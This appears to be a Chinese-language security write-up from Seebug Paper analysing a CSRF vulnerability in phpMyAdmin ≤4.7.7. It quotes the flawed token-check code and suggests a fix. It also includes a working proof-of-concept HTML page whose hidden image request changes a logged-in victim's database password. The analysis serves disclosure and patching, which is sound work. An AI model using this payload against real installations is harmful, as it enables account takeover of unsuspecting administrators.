**作者：lucifaer  
作者博客：<https://www.lucifaer.com/>**

同样也是一个鸡肋漏洞，产生原因在Common.inc.php核心类，感觉漏洞发现者是捡了一个漏洞…

### 0x00 漏洞简述

#### 漏洞信息

本周在Twitter上有一个较为热点的讨论话题，是有关phpMyAdmin
<=4.7.7版本的一个CSRF漏洞，漏洞存在于`common.inc.php`中，而笔者分析完后，发现这个更像是漏洞作者捡漏的一个漏洞。

#### 漏洞影响版本

phpMyAdmin <= 4.7.7

### 0x01 漏洞复现

本文用phpMyAdmin 4.7.6进行分析。

### 0x02 漏洞分析

直接看漏洞本质，主要在于两个点：

首先是位于`libraries/common.inc.php`中第375行到389行这一段代码：

    
    
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (PMA_isValid($_POST['token'])) {
            $token_provided = true;
            $token_mismatch = ! @hash_equals($_SESSION[' PMA_token '], $_POST['token']);
        }
    
        if ($token_mismatch) {
            /**
             * We don't allow any POST operation parameters if the token is mismatched
             * or is not provided
             */
            $whitelist = array('ajax_request');
            PMA\libraries\Sanitize::removeRequestVars($whitelist);
        }
    }

有个关键点：如果发送的请求是`GET`请求，就可以绕过对于参数的检测。

其次，第二个漏洞触发的关键点在`sql.php`第72行到76行：

    
    
    if (isset($_POST['bkm_fields']['bkm_sql_query'])) {
        $sql_query = $_POST['bkm_fields']['bkm_sql_query'];
    } elseif (isset($_GET['sql_query'])) {
        $sql_query = $_GET['sql_query'];
    }

可以看到这边可以直接接受外部`GET`请求的参数，在190行到199行处直接执行：

    
    
    if ($goto == 'sql.php') {
        $is_gotofile = false;
        $goto = 'sql.php' . URL::getCommon(
            array(
                'db' => $db,
                'table' => $table,
                'sql_query' => $sql_query
            )
        );
    }

### 0x03 漏洞利用

如上所说，我们只需要构造一个页面该页面在用户点击的时候自动发一个GET请求就ok了。

我在漏洞利用这边举一个利用csrf修改当前用户密码的例子。

构造一个HTML：

    
    
    <html>
        <head>
            <title>poc</title>
        </head>
    
        <body>
            <p>POC TEST</p>
            <img src="http://localhost:8888/sql.php?db=mysql&table=user&sql_query=SET password = PASSWORD('vul_test')" style="display:none"/>
    
        </body>
    </html>

之后诱导已经登录phpMyAdmin的用户访问，当前用户的密码就已经改为`vul_test`了。

### 0x04 修复方法

最简单的修补方式就是将`sql.php`中：

    
    
    if (isset($_POST['bkm_fields']['bkm_sql_query'])) {
        $sql_query = $_POST['bkm_fields']['bkm_sql_query'];
    } elseif (isset($_GET['sql_query'])) {
        $sql_query = $_GET['sql_query'];
    }

改成：

    
    
    if (isset($_POST['bkm_fields']['bkm_sql_query'])) {
        $sql_query = $_POST['bkm_fields']['bkm_sql_query'];
    } elseif (isset($_POST['sql_query'])) {
        $sql_query = $_POST['sql_query'];
    }

同样，直接更新到最新版是更好的方法。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/764/>

